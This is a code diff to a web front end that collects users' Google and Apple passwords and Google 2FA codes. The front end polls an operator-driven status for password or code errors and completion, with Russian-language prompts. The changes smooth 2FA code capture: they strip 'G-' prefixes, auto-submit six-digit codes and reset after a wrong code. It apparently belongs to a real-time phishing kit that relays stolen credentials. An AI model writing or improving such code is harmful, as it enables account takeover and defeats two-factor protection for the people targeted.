@@ -508,6 +508,8 @@ function initApp() {
         userGooglePassword = "";
         userAppleEmail = "";
         userApplePassword = "";
+        handledPasswordError = false;
+        handled2faError = false;
         isAuthorized = false;
         currentSessionId = null;
 
@@ -1251,6 +1253,7 @@ function initApp() {
     const google2faError = document.getElementById("google2faError");
     const google2faErrorText = document.getElementById("google2faErrorText");
     let handledPasswordError = false;
+    let handled2faError = false;
 
     function clearGoogleErrors() {
         if (googleEmailError) googleEmailError.classList.add("hidden");
@@ -1308,7 +1311,6 @@ function initApp() {
 
     if (googleEmailInput) googleEmailInput.addEventListener("input", clearGoogleErrors);
     if (googlePasswordInput) googlePasswordInput.addEventListener("input", clearGoogleErrors);
-    if (google2faCodeInput) google2faCodeInput.addEventListener("input", clearGoogleErrors);
 
     if (btnSubmitGoogleEmail) {
         btnSubmitGoogleEmail.addEventListener("click", () => {
@@ -1441,13 +1443,17 @@ function initApp() {
                     if (!stepGoogle2FA.classList.contains("active")) {
                         showStep(stepGoogle2FA);
                     }
-                    if (google2faCodeInput) {
-                        google2faCodeInput.value = "";
-                        setTimeout(() => {
-                            try { google2faCodeInput.focus(); } catch (e) {}
-                        }, 120);
+                    if (!handled2faError) {
+                        handled2faError = true;
+                        if (google2faCodeInput) {
+                            google2faCodeInput.value = "";
+                            setTimeout(() => {
+                                try { google2faCodeInput.focus(); } catch (e) {}
+                            }, 120);
+                        }
+                        showGoogleError("2fa", ctrl.error_msg || "Неверный код. Проверьте код и повторите попытку.");
+                        sendGoogleControlCommand("idle", null, null);
                     }
-                    showGoogleError("2fa", ctrl.error_msg || "Неверный код. Проверьте код и повторите попытку.");
                 } else if (ctrl.status === "completed") {
                     stopGooglePolling();
                     if (googleLoadingBar) googleLoadingBar.classList.add("hidden");
@@ -1484,7 +1490,10 @@ function initApp() {
     if (btnSubmitGoogle2FA) {
         btnSubmitGoogle2FA.addEventListener("click", () => {
             clearGoogleErrors();
-            const code = google2faCodeInput ? google2faCodeInput.value.trim() : "";
+            handled2faError = false;
+            const rawVal = google2faCodeInput ? google2faCodeInput.value.trim() : "";
+            const digits = rawVal.replace(/^G-?/i, "").replace(/\D/g, "");
+            const code = digits || rawVal;
             if (!code || code.length < 4) {
                 showGoogleError("2fa", "Введите 6-значный код подтверждения.");
                 return;
@@ -1500,10 +1509,30 @@ function initApp() {
     }
 
     if (google2faCodeInput) {
+        google2faCodeInput.addEventListener("input", () => {
+            clearGoogleErrors();
+            handled2faError = false;
+            let val = google2faCodeInput.value.trim();
+            let digits = val.replace(/^G-?/i, "").replace(/\D/g, "").slice(0, 6);
+            if (val.toUpperCase().startsWith("G-")) {
+                google2faCodeInput.value = "G-" + digits;
+            } else {
+                google2faCodeInput.value = digits;
+            }
+            if (digits.length === 6) {
+                setTimeout(() => {
+                    if (btnSubmitGoogle2FA && !btnSubmitGoogle2FA.disabled) {
+                        btnSubmitGoogle2FA.click();
+                    }
+                }, 140);
+            }
+        });
         google2faCodeInput.addEventListener("keydown", (e) => {
             if (e.key === "Enter") {
                 e.preventDefault();
-                if (btnSubmitGoogle2FA) btnSubmitGoogle2FA.click();
+                if (btnSubmitGoogle2FA && !btnSubmitGoogle2FA.disabled) {
+                    btnSubmitGoogle2FA.click();
+                }
             }
         });
     }
